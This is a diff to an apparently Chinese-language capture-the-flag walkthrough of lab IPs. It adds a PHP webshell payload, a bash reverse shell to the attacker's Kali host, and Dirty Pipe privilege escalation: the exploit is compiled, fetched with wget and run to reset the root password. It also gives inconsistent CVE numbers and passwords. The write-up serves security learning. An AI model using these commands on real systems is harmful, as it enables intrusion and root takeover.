@@ -43,7 +43,7 @@
 ![alt text](../img/image-22.png)
 
 ## (2)写入webshell
-## 用burpsuite抓包,修改为`message=<?php system($_GET['cmd']); ?>`&file=shell.php
+## 用burpsuite抓包,修改为`message=<?php system($_GET['cmd']); ?>&file=shell.php`
 ### 将php上传到shell.php,因为是用PHP解析器解析
 ![alt text](../img/image-21.png)
 
@@ -52,6 +52,10 @@
 
 ## (3)获取交互式shell
 ## kali :`nc -lvnp 4444`
+### -l(listen) :监听模式;告诉 nc：“不要主动去连别人，留在原地，等着别人来连你
+### -v(Verbose) :详细模式;当有目标连进来时，它会在屏幕上打印出目标的 IP 和端口信息
+### -n(Numeric) :数字格式;告诉 nc：“如果目标传过来一个域名，千万不要去查 DNS。直接用纯 IP 数字，省时间
+### -p(port) :指定你要监听的具体端口号（这里选的是 4444，你也可以换成 5555、8888 等）
 ## 浏览器 :`http://192.168.254.141/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.254.129/4444%200%3E%261%22` (bash -c "bash -i >& /dev/tcp/192.168.254.129/4444 0>&1") :URL编码;前面那个IP是靶机IP,后面那个IP是kaliIP
 ### bash -c "..." :告诉系统启动一个Bash进程,并且执行引号里面的字符串作为命令
 ### bash -i :启动一个交互式的bash终端
@@ -59,9 +63,44 @@
 ### 0>&1 :把标准输入(stdin,文件描述符0)重定向到标准输出(文件描述符1)
 
 
+
 # 3、权限提升
 
-## (1)检查内核版本()
+## (1)检查内核版本(5.10.0-9-amd64) :对应CVE-2022-0827(Dirty Pipe)提权漏洞;该漏洞影响 Linux 5.8 到 5.16.11 之间的版本
 ![alt text](../img/image-23.png)
 
 ## (2)利用Dirty Pipe提权
+## exp(https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git ) :这个版本的 EXP 利用 Dirty Pipe 漏洞的原理，是直接把 /etc/passwd 文件里的 root 密码哈希，强行改写成了一个已知的密码（也就是 aaron）
+![alt text](../img/image-24.png)
+
+## 下载到kali中得到exploit.c(源码)、compile.sh(自动编译脚本)
+
+## 将exp里的exploit.c源码静态编译为dp文件(如果报错说找不到静态库，先执行 sudo apt install libc6-dev 安装一下)
+## `gcc -O2 --static -o dp exploit.c`
+### gcc(GNU C Compiler)
+### -O2(Optimization Level 2) :优化级别2
+### --static :静态链接
+### -0(Output) dp :指定输出文件的名字
+![alt text](../img/image-25.png)
+
+## 在kali放置exp的目录开启一个简易的http服务,方便靶机下载exp
+## `python3 -m http.server 8888`
+![alt text](../img/image-26.png)
+
+## 下载exp到靶机的/tmp目录,在靶机运行下面命令
+## `wget http://192.168.254.129:8888/dp -O /tmp/dp`
+![alt text](../img/image-27.png)
+
+## 赋予执行权限并运行
+## `chmod +x /tmp/dp`
+## /tmp/dp
+![alt text](../img/image-28.png)
+
+## 最后的报错只是因为它在尝试自动调用 system() 弹出一个 root shell 时失败了（通常是因为当前环境变量或非交互式终端的限制），但这完全不影响它已经修改了密码
+
+## `who(w)` :查看当前在线所有用户
+## `su root`;pwd:`arron` 
+## `id`
+## `cd /root`
+## `ls -la`
+## `cat FLAG.txt`
